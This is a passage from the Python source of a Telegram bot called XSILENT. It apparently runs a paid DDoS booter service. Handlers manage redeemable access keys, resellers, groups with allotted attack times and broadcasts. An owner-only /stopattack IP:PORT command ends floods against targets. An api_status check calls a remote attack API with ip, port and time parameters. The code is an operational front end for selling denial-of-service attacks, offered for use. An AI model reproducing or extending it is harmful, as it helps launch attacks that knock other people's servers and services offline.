    save_groups(groups)
    bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 {group_id}\n⏱️ {attack_time}s")

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
        return
    
    group_id = args[1]
    if group_id in groups:
        del groups[group_id]
        save_groups(groups)
        bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 {group_id}")
    else:
        bot.reply_to(msg, "❌ Group not found!")

@bot.message_handler(commands=['allgroups'])
def all_groups(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    group_list = []
    for group_id, info in groups.items():
        group_list.append(f"👥 {group_id}\n   ⏱️ {info['attack_time']}s\n   👑 {info['added_by']}")
    
    if group_list:
        bot.reply_to(msg, f"📋 {bold('ALL GROUPS')}:\n\n" + "\n\n".join(group_list) + f"\n\nTotal: {len(groups)}")
    else:
        bot.reply_to(msg, "📋 No groups added yet!")

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at'], tz=IST).strftime('%d %b %Y, %I:%M %p')
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    
    content = (
        f"│ 🎉 User: {uid}\n"
        f"│ 🔑 Key: <code>{key}</code>\n"
        f"│ ⏰ Duration: {duration_display}\n"
        f"│ 📅 Expires: {expiry_str}\n"
        f"│ ⚡ Concurrent: {MAX_CONCURRENT}\n"
        f"│ ⏳ Cooldown: {COOLDOWN_TIME}s"
    )
    bot.reply_to(msg, styled_msg("ACCESS GRANTED", content, "success"), parse_mode="HTML")

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Unauthorized!", "error"))
        return
    
    my_generated_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"], tz=IST).strftime('%d %b %Y, %I:%M %p')
            duration_display = format_duration(info['duration_value'], info['duration_unit'])
            my_generated_keys.append(
                f"│ 🔑 <code>{key}</code>\n"
                f"│    ⏰ {duration_display}\n"
                f"│    📅 {expires}"
            )
    
    if my_generated_keys:
        body = "\n│\n".join(my_generated_keys)
        content = f"{body}\n│\n│ 👆 Tap key to copy!"
        bot.reply_to(msg, styled_msg("YOUR KEYS", content, "success"), parse_mode="HTML")
    else:
        bot.reply_to(msg, "📋 No keys generated yet!")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    if msg.reply_to_message:
        replied = msg.reply_to_message
        success = 0
        fail = 0
        
        for user in broadcast_users:
            try:
                bot.copy_message(
                    chat_id=user,
                    from_chat_id=msg.chat.id,
                    message_id=replied.message_id
                )
                success += 1
            except:
                fail += 1
        
        bot.reply_to(msg, styled_msg(
            "BROADCAST SENT",
            f"│ ✅ Success: {success}\n"
            f"│ ❌ Failed: {fail}\n"
            f"│ 📅 {format_ist_time(get_current_ist())}",
            "success"
        ))
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, styled_msg(
            "BROADCAST USAGE",
            "│ 📌 Reply to any message (photo/video/text)\n"
            "│ and send /broadcast\n"
            "│ OR\n"
            "│ 📌 /broadcast Your message here",
            "warning"
        ))
        return
    
    message = args[1]
    success = 0
    fail = 0
    
    for user in broadcast_users:
        try:
            bot.send_message(user, message)
            success += 1
        except:
            fail += 1
    
    bot.reply_to(msg, styled_msg(
        "BROADCAST SENT",
        f"│ ✅ Success: {success}\n"
        f"│ ❌ Failed: {fail}\n"
        f"│ 📅 {format_ist_time(get_current_ist())}",
        "success"
    ))

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 {target}\n👤 {info['user']}")
            try:
                bot.send_message(info['user'], f"⚠️ Attack on {target} stopped by owner!")
            except:
                pass
            break
    
    if not stopped:
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if info["target_key"] == target:
                    del bot_info["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
                    stopped = True
                    bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 {target}\n👤 {info['user']}")
                    break
            if stopped:
                break
    
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack on {target}")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(f"{role}: {u}")
    
    bot.reply_to(msg, f"📋 {bold('ALL USERS')}:\n\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    try:
        test_params = {
            "key": API_KEY,
            "ip": "8.8.8.8",
            "port": "53",
            "time": "1"
        }
        test_response = requests.get(API_URL, params=test_params, timeout=8)
        
        if test_response.status_code == 200:
            try:
                data = test_response.json()
                api_text = f"🟢 ONLINE\n│ 📄 {data.get('message', 'OK')}"
            except:
                api_text = "🟢 ONLINE"
        else:
            api_text = f"🔴 ERROR {test_response.status_code}"
        
        content = (
            f"│ 📡 API: {API_URL}\n"
            f"│ 🔑 Key: {API_KEY[:15]}...\n"
            f"│ 📊 Status: {api_text}\n"
            f"│ 🎯 Active: {get_total_active_count()}\n"
            f"│ 📅 {format_ist_time(get_current_ist())}"
        )
        bot.reply_to(msg, styled_msg("API STATUS", content))
    except Exception as e:
        bot.reply_to(msg, styled_msg(
            "API STATUS",
            f"│ ❌ API OFFLINE\n│ ⚠️ {str(e)[:40]}",
            "error"
        ))

@bot.message_handler(commands=['cleardb'])
def cleardb(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2 or args[1].lower() != "confirm":
        bot.reply_to(msg, styled_msg(
            "CLEAR DATABASE",
            "│ ⚠️ WARNING: This will DELETE ALL data!\n"
            "│ 🔑 All keys deleted\n"
            "│ 👥 All users removed\n"
            "│ 🤖 All hosted bots stopped\n"
            "│ 👥 All groups removed\n"
            "│ 📢 Broadcast list cleared\n"
            "│\n"
            "│ ✅ To confirm, send:\n"
            "│ /cleardb confirm",
            "warning"
        ))
        return
    
    progress_msg = bot.reply_to(msg, "🔄 Clearing database...")
    
    try:
        keys_collection.delete_many({})
        groups_collection.delete_many({})
        hosted_bots_collection.delete_many({})
        broadcast_users_collection.delete_many({})
        
        users_collection.delete_many({})
        users_collection.insert_one({
            "_id": "users",
            "users": [ADMIN_ID[0]],
            "resellers": []
        })
        
        settings_collection.delete_many({})
        settings_collection.insert_one({
            "_id": "settings",
            "max_concurrent": 2,
            "cooldown": 30
        })
        
        for token in list(hosted_bot_instances.keys()):
            try:
                hosted_bot_instances[token].stop_polling()
            except:
                pass
            del hosted_bot_instances[token]
        
        active_attacks.clear()
        cooldown.clear()
        hosted_bots.clear()
        
        global users, resellers, keys_data, groups, broadcast_users
        global MAX_CONCURRENT, COOLDOWN_TIME
        users = [ADMIN_ID[0]]
        resellers = []
        keys_data = {}
        groups = {}
        broadcast_users = []
        MAX_CONCURRENT = 2
        COOLDOWN_TIME = 30
        
        bot.edit_message_text(
            chat_id=msg.chat.id,
            message_id=progress_msg.message_id,
            text=styled_msg(
                "DATABASE CLEARED",
                f"│ ✅ All data deleted!\n"
                f"│\n"
                f"│ 📊 Summary:\n"
                f"│   🔑 Keys: 0\n"
                f"│   👥 Users: 1 (admin)\n"
                f"│   🤖 Hosted Bots: 0\n"
                f"│   👥 Groups: 0\n"
                f"│   📢 Broadcast: 0\n"
                f"│   ⚡ Max Concurrent: 2\n"
                f"│   ⏳ Cooldown: 30s\n"
                f"│\n"
                f"│ 📅 {format_ist_time(get_current_ist())}",
                "success"
            )
        )
        
        print(f"✅ DATABASE CLEARED by {uid}")
        
    except Exception as e:
        bot.edit_message_text(
            chat_id=msg.chat.id,
            message_id=progress_msg.message_id,
            text=styled_msg(
                "CLEAR FAILED",
                f"│ ❌ Error: {str(e)[:60]}\n"
                f"│ 📞 Check MongoDB!",
                "error"
            )
        )

# ========== START BOT ==========
print("=" * 50)
print("✨ XSILENT BOT STARTED ✨")
print(f"👑 Owner: 8487946379")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"📊 Hosted Bots: {len(hosted_bots)}")
print(f"🌐 API: {API_URL}")
print(f"🗑️ Auto-delete: Finish={AUTO_DELETE_FINISH}s, Launch={AUTO_DELETE_LAUNCH}")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")
print("=" * 50)

bot.infinity_polling()
